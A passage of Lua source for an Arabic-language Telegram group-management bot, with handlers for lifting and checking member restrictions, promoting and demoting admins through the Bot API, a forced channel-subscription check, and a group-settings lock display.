local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match('^رفع القيود @(.*)') and Manager2(msg) then 
local username = text:match('^رفع القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if SudoBot2(msg) then
database:srem(bot_id..'GBan:User',result.id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = ' ⋄المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "رفع القيود" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if SudoBot2(msg) then
database:srem(bot_id..'GBan:User',result.sender_user_id_)
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and Manager2(msg) then 
local username = text:match('^كشف القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
Textt = " ⋄الحظر العام »> "..GBan.."\n⋄الحظر »> "..Ban.."\n⋄الكتم »> "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = ' ⋄المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" then
if not Manager2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
return false
end 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_) then
Ban = 'محظور'
else
Ban = 'غير محظور'
end
if database:sismember(bot_id..'GBan:User',result.sender_user_id_) then
GBan = 'محظور عام'
else
GBan = 'غير محظور عام'
end
if database:sismember(bot_id..'Gmute:User',result.sender_user_id_) then
Gmute = 'محظور عام'
else
Gmute = 'غير محظور عام'
end
Textt = " ⋄الحظر العام »> "..GBan.."\n⋄الكتم العام »> "..Gmute.."\n⋄الحظر »> "..Ban.."\n⋄الكتم »> "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄الايدي »> `'..result.sender_user_id_..'`\n⋄تم رفعه مشرف '
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=false&can_manage_voice_chats=True&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم رفعه مشرف '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, ' ⋄لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄الايدي »> `'..result.sender_user_id_..'`\n⋄تم تنزيله ادمن من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله ادمن من الجروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end


if text == ("رفع مشرف كامل") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n​⋄الايدي »> `'..result.sender_user_id_..'`\n⋄تم رفعه مشرف بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مشرف كامل @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع مشرف كامل @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم رفعه مشرف بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, ' ⋄لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل مشرف كامل") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄الايدي »> `'..result.sender_user_id_..'`\n⋄تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مشرف كامل @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل مشرف كامل @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله ادمن من الجروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, ' ⋄لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == "توكن البوت" or text == 'التوكن' then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end 
send(msg.sender_user_id_,token)
send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
end
----------------------------------------- انتها المميزات
if text == 'اعدادات الجروب' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end    
if database:get(bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = '🔓'
else 
lock_pin = '🔐'    
end
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = '🔓'
else 
lock_tagservr = '🔐'    
end
if database:get(bot_id..'lock:text'..msg.chat_id_) then    
lock_text = '🔓'
else 
lock_text = '🔐'    
end
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = '🔓'
else 
lock_add = '🔐'    
end    
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = '🔓'
else 
lock_join = '🔐'    
end    
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = '🔓'
else 
lock_edit = '🔐'    
end
print(welcome)
if database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = '🔓'
else 
welcome = '🔐'    
end
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = '🔓'
else 
lock_edit_med = '🔐'    
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم'           
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالمسح'           
else     
flood = '🔐'     
end
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = '🔓' 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد'   
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم'    
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد'   
else
lock_photo = '🔐'   
end    
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = '🔓' 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد'    
else
lock_phon = '🔐'    
end    
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '🔓'
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد'    
else
lock_links = '🔐'    
end
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '🔓'
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد'    
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم'   
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد'    
else
lock_cmds = '🔐'    
end
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '🔓'
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد'    
else
lock_user = '🔐'    
end
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '🔓'
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد'    
else
lock_hash = '🔐'    
end
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = '🔓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد'    
else
lock_muse = '🔐'    
end 
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = '🔓'
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد'    
else
lock_ved = '🔐'    
end
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = '🔓'
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد'    
else
lock_gif = '🔐'    
end
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = '🔓'
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد'    
else
lock_ste = '🔐'    
end
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = '🔓'
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد'    
else
lock_geam = '🔐'    
end    
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = '🔓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد'    
else
lock_vico = '🔐'    
end    
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = '🔓'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم'    
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد'
else
lock_inlin = '🔐'
end
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = '🔓'
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد'    
else
lock_fwd = '🔐'    
end    
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = '🔓'
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد'    
else
lock_file = '🔐'    
end    
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = '🔓'
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد'    
else
lock_self = '🔐'    
end
if database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '🔓'
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد'   
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد'    
else
lock_bots = '🔐'    
end
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = '🔓'
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد'    
else
lock_mark = '🔐'    
end
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '🔓'
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد'    
else
lock_spam = '🔐'    
end        
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
rdmder = '🔓'
else
rdmder = '🔐'
end
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
rdsudo = '🔓'
else
rdsudo = '🔐'
end
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
idgp = '🔓'
else
idgp = '🔐'
end
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then
idph = '🔓'
else
idph = '🔐'
end
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = '🔓'
else
setadd = '🔐'
end
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
banm = '🔓'
else
banm = '🔐'
end
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
addme = '🔓'
else
addme = '🔐'
end
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
sehuser = '🔓'
else
sehuser = '🔐'
end
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
kickme = '🔓'
else
kickme = '🔐'
end
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'\n⚙️┇𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂'..
'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ '..
'\n⋄اعدادات الجروب كتالي √↓'..
'\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•'..
'\n⋄علامة ال {🔓} تعني مفعل'..
'\n⋄علامة ال {🔐} تعني معطل'..
'\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•'..
'\n⋄الروابط »> { '..lock_links..
' }\n'..' ⋄المعرفات »> { '..lock_user..
' }\n'..' ⋄التاك »> { '..lock_hash..
' }\n'..' ⋄البوتات »> { '..lock_bots..
' }\n'..' ⋄التوجيه »> { '..lock_fwd..
' }\n'..' ⋄التثبيت »> { '..lock_pin..
' }\n'..' ⋄الاشعارات »> { '..lock_tagservr..
